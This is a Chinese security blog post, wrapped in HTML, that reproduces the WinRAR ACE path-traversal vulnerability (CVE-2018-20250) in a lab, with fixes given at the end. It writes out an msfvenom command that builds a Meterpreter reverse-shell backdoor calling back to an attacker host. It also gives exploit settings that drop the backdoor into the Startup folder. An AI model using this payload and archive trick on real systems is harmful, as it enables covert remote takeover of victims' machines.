@@ -1,0 +1,183 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>WinRAR远程代码执行漏洞 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/1111/1.jpg')">
+            </div>
+          
+          <h2 class="post-title">WinRAR远程代码执行漏洞</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-04-20</span>
+            
+          </div>
+          <div class="post-content">
+            <p>  去客户那边做安全检查，发现很多终端安装的是存在漏洞的压缩软件。攻击者只需利用此漏洞构造恶意的压缩文件，并以钓鱼邮件、网盘、论坛等方式诱导受害者下载恶意构造文件，当受害者使用存在漏洞的压缩软件解压该恶意文件时，即可完成整个攻击过程，植入后门。这里简单复现一下，方便演示给那些抬杠的客户看！！！</p>
+<!-- more -->
+<h3 id="0x01-漏洞描述">0x01 漏洞描述</h3>
+<p>  该漏洞存在于WinRAR的UNACEV2.dll库中，在WinRAR解压缩ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越。允许攻击者将恶意程序写入启动目录文件夹中，导致受害者在执行重启操作后自动运行恶意程序，达到攻击的目的。</p>
+<h3 id="0x02-影响范围">0x02 影响范围</h3>
+<p>据统计受影响的软件版本如下</p>
+<blockquote>
+<p>WinRAR &lt; 5.70 Beta 1<br>
+Bandizip &lt; = 6.2.0.0<br>
+好压(2345压缩) &lt; = 5.9.8.10907<br>
+360压缩 &lt; = 4.0.0.1170</p>
+</blockquote>
+<h3 id="0x03-生成恶意程序">0x03 生成恶意程序</h3>
+<p><strong>Kali:192.168.200.109     Win7：192.168.200.130</strong><br>
+这里利用msf生成一个后门文件</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.109 LPORT=4444 -f exe -o msf.exe
+</code></pre>
+<h3 id="0x04-生成漏洞压缩文件">0x04 生成漏洞压缩文件</h3>
+<p>这里下载大佬的<a href="https://github.com/WyAtu/CVE-2018-20250">EXP</a>,打开exp.py文件进行编辑，说一下需要修改的地方 （<strong>注意修改第50行你自己的python3环境</strong>）</p>
+<blockquote>
+<p>rar_filename = &quot;tuchuang.rar&quot;     <strong>运行脚本后生成的压缩文件名字</strong><br>
+evil_filename = &quot;shell.exe&quot;                 <strong>运行脚本后投放的恶意文件（默认隐藏）</strong><br>
+target_filename = r&quot;C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe&quot;       <strong>受害者解压后恶意文件的释放路径</strong><br>
+filename_list = [&quot;ReadME.txt&quot;]         <strong>打开压缩软件时里面的文件</strong></p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/1111/rar.png" alt="rar" loading="lazy"></figure>
+<h3 id="0x05-释放恶意文件">0x05 释放恶意文件</h3>
+<p>受害者解压后会自动将恶意程序投放到启动目录文件夹中<br>
+<img src="https://tuchuang.looklook.workers.dev/1111/start.png" alt="start" loading="lazy"></p>
+<h3 id="0x06-回连shell">0x06 回连shell</h3>
+<p>当受害者重启电脑后，会自动运行恶意程序，回连msf<br>
+<img src="https://tuchuang.looklook.workers.dev/1111/shell.png" alt="shell" loading="lazy"></p>
+<h3 id="0x07-修复方法">0x07 修复方法</h3>
+<ul>
+<li>1.删除 UNACEV2.dll文件；</li>
+<li>2.更新压缩软件版本至最新版。</li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/tomcat-ghost.html/">
+              <h3 class="post-title">
+                下一篇：CVE-2020-1938 Tomcat AJP复现
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
